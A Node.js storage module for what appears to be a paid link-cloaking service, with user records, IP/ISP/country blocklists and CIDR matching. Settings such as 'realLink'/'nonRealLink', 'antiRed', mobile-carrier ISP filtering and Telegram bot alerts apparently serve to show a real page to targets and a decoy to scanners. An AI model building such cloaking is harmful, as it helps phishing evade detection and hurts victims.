const fs = require('fs').promises;
const fssync = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');

// Support Render Persistent Disk at /data
const PERSISTENT_DATA_DIR = '/data';
const LOCAL_DATA_DIR = path.join(__dirname, 'data');
const DATA_DIR = fssync.existsSync(PERSISTENT_DATA_DIR) ? PERSISTENT_DATA_DIR : LOCAL_DATA_DIR;

const USERS_FILE = path.join(DATA_DIR, 'users.json');

console.log(`[DB] Using data directory: ${DATA_DIR}`);
console.log(`[DB] Users file: ${USERS_FILE}`);

if (!fssync.existsSync(DATA_DIR)) {
    try {
        fssync.mkdirSync(DATA_DIR, { recursive: true });
    } catch (err) {
        console.error(`Error creating data directory ${DATA_DIR}:`, err);
    }
}

if (!fssync.existsSync(USERS_FILE)) {
    fssync.writeFileSync(USERS_FILE, JSON.stringify([]));
}

// --- Admin-level blocklists (IP / ISP / Country) ---
// Site-wide rules applied to /l/:slug regardless of which user's link was hit.
const ADMIN_BLOCKS_FILE = path.join(DATA_DIR, 'admin-blocklists.json');

if (!fssync.existsSync(ADMIN_BLOCKS_FILE)) {
    fssync.writeFileSync(ADMIN_BLOCKS_FILE, JSON.stringify({
        ips: [],
        isps: [],
        countries: []
    }, null, 2));
}

const VALID_BLOCK_TYPES = new Set(['ips', 'isps', 'countries']);

// --- IPOperator helpers: exact / wildcard / CIDR matching for IPv4 & IPv6 ---
function ipv4ToInt(addr) {
    const parts = String(addr).split('.');
    if (parts.length !== 4) return null;
    let acc = 0;
    for (const p of parts) {
        if (p === '*') return null; // mixed wildcard -> caller handles
        const n = Number(p);
        if (!Number.isInteger(n) || n < 0 || n > 255) return null;
        acc = (acc * 256) + n;
    }
    return acc >>> 0;
}

function ipv6ToBigInt(addr) {
    // Expand :: then split on ':' to exactly 8 groups of 16-bit hextets.
    if (typeof addr !== 'string' || !addr.includes(':')) return null;
    const double = addr.indexOf('::');
    let head = [], tail = [];
    if (double >= 0) {
        const left = addr.slice(0, double);
        const right = addr.slice(double + 2);
        head = left === '' ? [] : left.split(':');
        tail = right === '' ? [] : right.split(':');
        if (head.includes('') || tail.includes('')) return null;
    } else {
        head = addr.split(':');
        tail = [];
    }
    const groups = head.concat(tail);
    if (groups.length > 8) return null;
    while (groups.length < 8) groups.splice(head.length, 0, '0');
    let acc = 0n;
    for (const g of groups) {
        if (!/^[0-9a-fA-F]{1,4}$/.test(g)) return null;
        acc = (acc << 16n) | BigInt(parseInt(g, 16));
    }
    return acc;
}

function isValidIpLiteral(v) {
    // IPv4 dotted notation or IPv6 (full or partial). CIDR suffix handled separately.
    if (typeof v !== 'string' || !v) return false;
    if (/^\d{1,3}(\.\d{1,3}){3}$/.test(v)) {
        return v.split('.').every(o => {
            const n = Number(o);
            return n >= 0 && n <= 255;
        });
    }
    return /^[0-9a-fA-F:]+$/.test(v) && v.includes(':');
}

function ipRuleKind(value) {
    // Returns 'exact' | 'cidr' | 'wildcard' | null
    if (typeof value !== 'string' || !value) return null;
    const v = value.trim();
    if (v.includes('*')) return /^\d{1,3}(\.\d{1,3}){3}$/.test(v.replace(/\*/g, '0')) ? 'wildcard' : null;
    if (v.includes('/')) {
        const [base, maskRaw] = v.split('/');
        if (!maskRaw || !/^\d{1,3}$/.test(maskRaw)) return null;
        const mask = parseInt(maskRaw, 10);
        if (!isValidIpLiteral(base)) return null;
        if (base.includes(':')) {
            if (mask < 0 || mask > 128) return null;
        } else {
            if (mask < 0 || mask > 32) return null;
        }
        return 'cidr';
    }
    return isValidIpLiteral(v) ? 'exact' : null;
}

function ipMatchesRule(clientIp, ruleValue) {
    if (!clientIp || !ruleValue) return false;
    const kind = ipRuleKind(ruleValue);
    if (!kind) return false;

    if (kind === 'exact') return clientIp === ruleValue.trim();

    const cidrOrWild = ruleValue.trim();
    if (cidrOrWild.includes(':')) {
        // IPv6 CIDR only (no wildcard for v6)
        if (kind !== 'cidr') return false;
        const [base, maskRaw] = cidrOrWild.split('/');
        const mask = parseInt(maskRaw, 10);
        const ipBig = ipv6ToBigInt(clientIp);
        const baseBig = ipv6ToBigInt(base);
        if (ipBig === null || baseBig === null) return false;
        if (mask === 0) return true;
        const shift = BigInt(128 - mask);
        return (ipBig >> shift) === (baseBig >> shift);
    }

    // IPv4 CIDR or wildcard (treat wildcard as /N where N = bits before the first *)
    const octetsRule = cidrOrWild.split('.');
    if (octetsRule.length !== 4) return false;
    const ipParts = clientIp.split('.');
    if (ipParts.length !== 4) return false;
    if (kind === 'wildcard') {
        for (let i = 0; i < 4; i++) {
            const r = octetsRule[i];
            if (r === '*') continue;
            if (!/^\d{1,3}$/.test(r)) return false;
            if (Number(r) !== Number(ipParts[i])) return false;
        }
        return true;
    }
    // CIDR for v4
    const mask = parseInt(cidrOrWild.split('/')[1], 10);
    const ipInt = ipv4ToInt(clientIp);
    const baseInt = ipv4ToInt(cidrOrWild.split('/')[0]);
    if (ipInt === null || baseInt === null) return false;
    if (mask === 0) return true;
    const m = mask === 32 ? 0xffffffff : (~((1 << (32 - mask)) - 1)) >>> 0;
    return (ipInt & m) === (baseInt & m);
}

function ipMatchesAnyBlock(clientIp, blocksArr) {
    if (!clientIp || !Array.isArray(blocksArr)) return null;
    for (const entry of blocksArr) {
        if (!entry || !entry.value) continue;
        if (ipMatchesRule(clientIp, entry.value)) return entry;
    }
    return null;
}

// --- ISO 3166-1 alpha-2 country code registry (with human-readable names) ---
// Compact list curated for the admin blocklist dropdown — common countries first.
const ISO_COUNTRIES = [
    ['US', 'United States'], ['GB', 'United Kingdom'], ['CA', 'Canada'], ['AU', 'Australia'],
    ['DE', 'Germany'], ['FR', 'France'], ['NL', 'Netherlands'], ['IT', 'Italy'], ['ES', 'Spain'],
    ['SE', 'Sweden'], ['NO', 'Norway'], ['FI', 'Finland'], ['DK', 'Denmark'], ['IE', 'Ireland'],
    ['CH', 'Switzerland'], ['AT', 'Austria'], ['BE', 'Belgium'], ['PT', 'Portugal'], ['LU', 'Luxembourg'],
    ['PL', 'Poland'], ['CZ', 'Czechia'], ['SK', 'Slovakia'], ['HU', 'Hungary'], ['RO', 'Romania'],
    ['BG', 'Bulgaria'], ['GR', 'Greece'], ['HR', 'Croatia'], ['SI', 'Slovenia'], ['RS', 'Serbia'],
    ['UA', 'Ukraine'], ['BY', 'Belarus'], ['LT', 'Lithuania'], ['LV', 'Latvia'], ['EE', 'Estonia'],
    ['IS', 'Iceland'], ['MT', 'Malta'], ['CY', 'Cyprus'], ['TR', 'Turkey'], ['RU', 'Russia'],
    ['CN', 'China'], ['HK', 'Hong Kong'], ['TW', 'Taiwan'], ['MO', 'Macao'], ['JP', 'Japan'],
    ['KR', 'South Korea'], ['KP', 'North Korea'], ['MN', 'Mongolia'], ['SG', 'Singapore'],
    ['MY', 'Malaysia'], ['TH', 'Thailand'], ['VN', 'Vietnam'], ['PH', 'Philippines'],
    ['ID', 'Indonesia'], ['IN', 'India'], ['PK', 'Pakistan'], ['BD', 'Bangladesh'], ['LK', 'Sri Lanka'],
    ['NP', 'Nepal'], ['AE', 'United Arab Emirates'], ['SA', 'Saudi Arabia'], ['IL', 'Israel'],
    ['JO', 'Jordan'], ['LB', 'Lebanon'], ['SY', 'Syria'], ['IQ', 'Iraq'], ['IR', 'Iran'],
    ['KW', 'Kuwait'], ['QA', 'Qatar'], ['BH', 'Bahrain'], ['OM', 'Oman'], ['YE', 'Yemen'],
    ['EG', 'Egypt'], ['LY', 'Libya'], ['TN', 'Tunisia'], ['DZ', 'Algeria'], ['MA', 'Morocco'],
    ['SD', 'Sudan'], ['ET', 'Ethiopia'], ['KE', 'Kenya'], ['NG', 'Nigeria'], ['GH', 'Ghana'],
    ['ZA', 'South Africa'], ['ZW', 'Zimbabwe'], ['AO', 'Angola'], ['TZ', 'Tanzania'], ['UG', 'Uganda'],
    ['BR', 'Brazil'], ['AR', 'Argentina'], ['CL', 'Chile'], ['CO', 'Colombia'], ['PE', 'Peru'],
    ['VE', 'Venezuela'], ['EC', 'Ecuador'], ['BO', 'Bolivia'], ['UY', 'Uruguay'], ['PY', 'Paraguay'],
    ['MX', 'Mexico'], ['CR', 'Costa Rica'], ['PA', 'Panama'], ['CU', 'Cuba'], ['DO', 'Dominican Republic'],
    ['GT', 'Guatemala'], ['HN', 'Honduras'], ['SV', 'El Salvador'], ['NI', 'Nicaragua'], ['PR', 'Puerto Rico'],
    ['JM', 'Jamaica'], ['TT', 'Trinidad and Tobago'], ['BS', 'Bahamas'], ['BZ', 'Belize'],
    ['NZ', 'New Zealand'], ['FJ', 'Fiji'], ['PG', 'Papua New Guinea'], ['WS', 'Samoa'], ['TO', 'Tonga'],
    ['AD', 'Andorra'], ['MC', 'Monaco'], ['SM', 'San Marino'], ['VA', 'Vatican City'], ['LI', 'Liechtenstein'],
    ['AM', 'Armenia'], ['AZ', 'Azerbaijan'], ['GE', 'Georgia'], ['KZ', 'Kazakhstan'], ['UZ', 'Uzbekistan'],
    ['TM', 'Turkmenistan'], ['KG', 'Kyrgyzstan'], ['TJ', 'Tajikistan'], ['AF', 'Afghanistan'],
    ['MM', 'Myanmar'], ['KH', 'Cambodia'], ['LA', 'Laos'], ['BN', 'Brunei'], ['TL', 'Timor-Leste'],
    ['MV', 'Maldives'], ['BT', 'Bhutan'], ['PS', 'Palestine'], ['KW', 'Kuwait'], ['UN', 'Unknown']
].map(([code, name]) => ({ code, name }));

const ISO_COUNTRY_BY_CODE = (() => {
    const map = {};
    for (const c of ISO_COUNTRIES) map[c.code] = c.name;
    return map;
})();

async function readAdminBlocks() {
    const data = await fs.readFile(ADMIN_BLOCKS_FILE, 'utf8');
    try {
        const parsed = JSON.parse(data);
        return {
            ips: Array.isArray(parsed.ips) ? parsed.ips : [],
            isps: Array.isArray(parsed.isps) ? parsed.isps : [],
            countries: Array.isArray(parsed.countries) ? parsed.countries : []
        };
    } catch (_) {
        return { ips: [], isps: [], countries: [] };
    }
}

async function writeAdminBlocks(blocks) {
    const safe = {
        ips: Array.isArray(blocks.ips) ? blocks.ips : [],
        isps: Array.isArray(blocks.isps) ? blocks.isps : [],
        countries: Array.isArray(blocks.countries) ? blocks.countries : []
    };
    await fs.writeFile(ADMIN_BLOCKS_FILE, JSON.stringify(safe, null, 2));
}

async function addAdminBlock(type, value, reason, addedBy = 'ADMIN') {
    if (!VALID_BLOCK_TYPES.has(type)) {
        throw new Error('Invalid block type');
    }
    const v = typeof value === 'string' ? value.trim() : '';
    if (!v) throw new Error('EMPTY_VALUE');
    const blocks = await readAdminBlocks();
    const dup = blocks[type].some(b => String(b.value).toLowerCase() === v.toLowerCase());
    if (dup) {
        const err = new Error('DUPLICATE_VALUE');
        err.code = 'DUPLICATE_VALUE';
        throw err;
    }
    const entry = {
        id: uuidv4(),
        value: type === 'countries' ? v.toUpperCase() : v,
        rule: type === 'ips' ? (ipRuleKind(v) || 'exact') : null,
        reason: typeof reason === 'string' ? reason.trim().slice(0, 200) : '',
        addedAt: new Date().toISOString(),
        addedBy: typeof addedBy === 'string' ? addedBy.slice(0, 80) : 'ADMIN'
    };
    blocks[type].push(entry);
    await writeAdminBlocks(blocks);
    return blocks;
}

async function removeAdminBlock(type, id) {
    if (!VALID_BLOCK_TYPES.has(type)) {
        throw new Error('Invalid block type');
    }
    const blocks = await readAdminBlocks();
    blocks[type] = (blocks[type] || []).filter(b => b.id !== id);
    await writeAdminBlocks(blocks);
    return blocks;
}

async function getUsers() {
    const data = await fs.readFile(USERS_FILE, 'utf8');
    return JSON.parse(data);
}

async function saveUsers(users) {
    await fs.writeFile(USERS_FILE, JSON.stringify(users, null, 2));
}

async function createUser(userData) {
    const users = await getUsers();
    const newUser = {
        id: uuidv4(),
        slug: crypto.randomBytes(4).toString('hex'),
        name: userData.name,
        email: userData.email,
        telegram: userData.telegram,
        password: userData.password, // hashed
        pinHash: userData.pinHash || null, // 4-digit security PIN (bcrypt hash); null until set
        wallet: 0.0,
        isActive: true,
        expiryDate: null, // ISO string for link expiration
        links: [], // Multiple landing pages
        settings: {
            nonRealLink: '',
            realLink: '',
            antiRed: true,
            ispFilter: true,
            reallowVisited: true,
            botToken: '',
            chatId: '',
            mobileIsps: ['ATT', 'VERIZON', 'T-MOBILE', 'SPRINT', 'CRICKET', 'METROPCS']
        },
        forcedIps: [],
        blockedIps: [],
        visitedIps: [],
        pendingPayments: [],
        createdAt: new Date().toISOString()
    };
    users.push(newUser);
    await saveUsers(users);
    return newUser;
}

async function findUserByEmail(email) {
    const users = await getUsers();
    return users.find(u => u.email === email);
}

async function findUserById(id) {
    const users = await getUsers();
    return users.find(u => u.id === id);
}

async function findUserBySlug(slug) {
    if (!slug) return null;
    const users = await getUsers();
    // Only custom uplinks in user.links[] are resolvable now.
    for (const user of users) {
        const link = (user.links || []).find(l => l.slug === slug);
        if (link) return { user, link };
    }
    return null;
}

async function updateUser(id, updates) {
    const users = await getUsers();
    const index = users.findIndex(u => u.id === id);
    if (index !== -1) {
        users[index] = { ...users[index], ...updates };
        await saveUsers(users);
        return users[index];
    }
    return null;
}

module.exports = {
    createUser,
    getUsers,
    findUserByEmail,
    findUserById,
    findUserBySlug,
    updateUser,
    readAdminBlocks,
    writeAdminBlocks,
    addAdminBlock,
    removeAdminBlock,
    VALID_BLOCK_TYPES,
    ipRuleKind,
    ipMatchesRule,
    ipMatchesAnyBlock,
    ISO_COUNTRIES,
    ISO_COUNTRY_BY_CODE
};
